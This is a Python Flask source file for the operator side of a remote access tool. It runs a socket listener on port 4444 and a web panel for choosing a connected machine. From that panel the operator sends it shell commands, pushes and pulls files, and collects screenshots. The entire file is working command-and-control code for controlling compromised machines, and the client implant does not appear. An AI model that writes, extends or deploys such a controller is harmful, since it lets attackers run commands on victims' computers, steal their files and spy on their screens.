import socket
import threading
import flask
from flask import *
import json
import string
import random
import time
import os

host = "127.0.0.1"
port = 4444
clients = []
addrs = []
app = Flask(__name__)
picFolder = os.path.join("static","pics")
app.config["UPLOAD_FOLDER"] = picFolder

def alwaysListen(server):
    while True:
        client,address = server.accept()
        clients.append(client)
        addrs.append(address)

def reliable_send(client,data):
    jsonData = json.dumps(data)
    client.send(jsonData.encode())

def reliable_recv(client):
    jsonData = ""
    while True:
        try:
            jsonData = jsonData + client.recv(1024).decode()
            return json.loads(jsonData)
        except ValueError:
            continue

def upload(client,fileName):
    f = open(fileName,"rb")
    client.send(f.read())

def download(client,fileName):
    f = open(fileName,"wb")
    client.settimeout(1)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()

def randomName():
	str = string.digits + string.ascii_letters
	randomName = ""
	for i in range(10):
			randomName = randomName + random.choice(str)
	return randomName + ".jpg"

@app.before_first_request
def initServer():
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((host,port))
    server.listen(2)
    print("[+] Server is listening at port {}".format(port))
    t = threading.Thread(target=alwaysListen,args=(server,))
    t.start()

@app.route("/")
def index():
    return render_template("/index.html",number=len(addrs),addrs=addrs)

@app.route("/execute")
def execute():
    return render_template("/execute.html")

@app.route("/session<i>")
def session(i):
    imgName = ""
    if int(i) >= len(clients) or int(i) < 0:
        return "Not found"
    return render_template("execute.html",i=i,imgLink=imgName)

@app.route("/session<i>/executecmd",methods=['POST','GET'])
def executecmd(i):
    output = ""
    imgName = ""
    cmd = request.form["cmd"]
    reliable_send(clients[int(i)],cmd)
    if cmd[:6] == "upload":
        fileName = cmd.split(" ")[1]
        upload(clients[int(i)],fileName)
        output = "Upload {}".format(fileName)
    elif cmd[:8] == "download":
        fileName = cmd.split(" ")[2]
        download(clients[int(i)],fileName)
        output = "Download {}".format(fileName)
    elif cmd == "screenshot":
        nameRandom = randomName()
        imgName = os.path.join(app.config["UPLOAD_FOLDER"],nameRandom)
        download(clients[int(i)],imgName)
        time.sleep(2)
    elif cmd[:2] == "cd" and len(cmd) > 3:
            output = "Changed directory to {}".format(cmd[3:])
    else:
        output = reliable_recv(clients[int(i)])
    return render_template("execute.html",output=output,i=i,imgLink=imgName)

if __name__ == "__main__":
    app.run(debug=True)
